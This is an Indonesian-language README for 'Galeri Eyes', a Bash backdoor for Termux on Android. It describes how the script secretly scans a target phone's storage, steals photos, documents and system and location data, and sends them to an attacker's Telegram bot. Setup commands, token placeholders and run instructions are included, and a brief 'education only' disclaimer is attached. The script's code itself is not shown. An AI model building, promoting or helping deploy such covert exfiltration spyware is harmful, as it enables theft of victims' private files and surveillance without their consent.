
# Galeri Eyes - Telegram Backdoor Script

**Galeri Eyes** adalah script backdoor berbasis Bash yang berjalan di Termux Android. Fungsinya untuk mengumpulkan file (terutama *foto dan dokumen*) dari penyimpanan internal target, lalu mengirimkannya secara diam-diam ke bot Telegram milik attacker.

## Fitur Utama

- **Backdoor otomatis** kirim file dari target ke Telegram
- Kirim file: `jpg`, `png`, `pdf`, `txt`, `zip`, `py`, dll
- Deteksi info sistem: merek HP, OS, RAM, lokasi (via IP), IP publik

## Cara Kerja

1. Script dijalankan di Termux pada perangkat target.
2. Script akan meminta akses storage dan setup tools yang dibutuhkan (`curl`, `jq`, `neofetch`).
3. Scan semua file dari `/storage/emulated/0/`.

## Instalasi & Penggunaan

**1. Install Tools di Termux**

```bash
pkg update && pkg upgrade
pkg install bash curl jq neofetch -y
termux-setup-storage
```

**2. Edit Script**

`Ubah bagian ini dengan Token Dan Admin ID telegram kalian.`
```bash
TOKEN="ISI_TOKEN_BOT"
CHAT_ID="ISI_CHAT_ID"
```

**3. Jalankan Script**

```
bash main.sh
```
Target File Ekstensi

jpg, png, IMG, pdf, txt, py, sh, zip, dll


### **Disclaimer**
> Script ini bersifat backdoor dan digunakan hanya untuk tujuan edukasi, testing keamanan, dan riset. Penggunaan untuk menyerang sistem tanpa izin adalah ilegal dan menjadi tanggung jawab pengguna sepenuhnya.




---
